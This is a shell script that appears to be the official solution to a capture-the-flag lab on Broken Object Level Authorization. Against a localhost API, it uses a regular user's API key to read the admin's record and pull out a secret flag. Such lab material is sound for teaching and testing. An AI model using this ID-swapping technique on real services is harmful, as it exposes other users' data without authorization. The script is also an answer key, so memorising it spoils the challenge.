#!/bin/bash
##
# Solution for BOLA Challenge
# Demonstrates how to exploit Broken Object Level Authorization
##

echo "=== BOLA Exploitation Demo ==="
echo ""

# Step 1: Explore the API
echo "[*] Step 1: Exploring the API..."
echo "GET http://localhost:4001/"
curl -s http://localhost:4001/ | jq .
echo ""

# Step 2: Login as alice to get API key
echo "[*] Step 2: Login as regular user 'alice'..."
echo "POST http://localhost:4001/api/login"
LOGIN_RESPONSE=$(curl -s -X POST http://localhost:4001/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice"}')

echo "$LOGIN_RESPONSE" | jq .
ALICE_KEY=$(echo "$LOGIN_RESPONSE" | jq -r '.api_key')
echo ""

# Step 3: Access alice's own profile (legitimate use)
echo "[*] Step 3: Access alice's own profile (user_id=1)..."
echo "GET http://localhost:4001/api/users/1"
curl -s -H "API-Key: $ALICE_KEY" http://localhost:4001/api/users/1 | jq .
echo ""

# Step 4: Exploit BOLA - access admin's profile with alice's key
echo "[*] Step 4: EXPLOIT - Access admin's profile (user_id=2) using alice's API key..."
echo "GET http://localhost:4001/api/users/2"
ADMIN_DATA=$(curl -s -H "API-Key: $ALICE_KEY" http://localhost:4001/api/users/2)
echo "$ADMIN_DATA" | jq .
echo ""

# Step 5: Extract the flag
echo "[*] Step 5: Extract the flag from admin's data..."
FLAG=$(echo "$ADMIN_DATA" | jq -r '.secret_flag')
echo "ðŸš© FLAG FOUND: $FLAG"
echo ""

# Step 6: Verify the flag
echo "[*] Step 6: Verifying the flag..."
echo "$FLAG"
